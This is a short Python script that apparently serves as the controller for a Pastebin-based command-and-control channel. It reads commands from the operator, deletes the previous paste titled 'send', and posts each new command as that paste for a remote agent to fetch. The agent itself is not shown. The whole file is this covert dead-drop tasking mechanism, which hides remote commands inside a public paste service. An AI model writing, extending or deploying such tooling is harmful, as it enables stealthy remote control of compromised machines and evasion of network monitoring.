import os
import requests
import xml.etree.ElementTree as ET
from dotenv import load_dotenv

load_dotenv()

PASTEBIN_USERAME=os.getenv('PASTEBIN_USERNAME')
PASTEBIN_PASSWORD=os.getenv('PASTEBIN_PASSWORD')
PASTEBIN_DEV_API_KEY=os.getenv('PASTEBIN_DEV_API_KEY')
PASTEBIN_USER_API_KEY=os.getenv('PASTEBIN_USER_API_KEY')


def get_send_key():
    payload={
        'api_dev_key' : PASTEBIN_DEV_API_KEY,
        'api_user_key' : PASTEBIN_USER_API_KEY,
        'api_option' : 'list'
    }

    response = requests.post("https://pastebin.com/api/api_post.php", data=payload)

    if response.status_code == 200:
        xml = ET.fromstring('<root>' + response.text + '</root>')
        result = xml.findall(".//paste[paste_title='send']/paste_key")
        return result[0].text if len(result) > 0 else None
    else:
        print("Error: not able to get pastes of user", response.status_code)
        return None
    

def create_send_paste(command):
    payload = {
        "api_dev_key" : PASTEBIN_DEV_API_KEY,
        "api_option" : 'paste',
        "api_paste_name" : 'send',
        "api_paste_code" : command,
        "api_user_key" : PASTEBIN_USER_API_KEY
    }

    response = requests.post("https://pastebin.com/api/api_post.php", data=payload)

    if response.status_code != 200:
        print("ERROR CREATING PASTE", response.status_code)
        
def delete_paste(paste_key):
    payload = {
        "api_dev_key" : PASTEBIN_DEV_API_KEY,
        "api_user_key" : PASTEBIN_USER_API_KEY,
        "api_paste_key" : paste_key,
        "api_option" : 'delete'
    }

    response = requests.post("https://pastebin.com/api/api_post.php", data=payload)
    return response.status_code == 200

def send_command():
    while True:
        command = input("command: ")
        send_paste_key = get_send_key()
        if send_paste_key != None:
            delete_paste(send_paste_key)
        create_send_paste(command)
    
if __name__ == "__main__":
    send_command()


    
    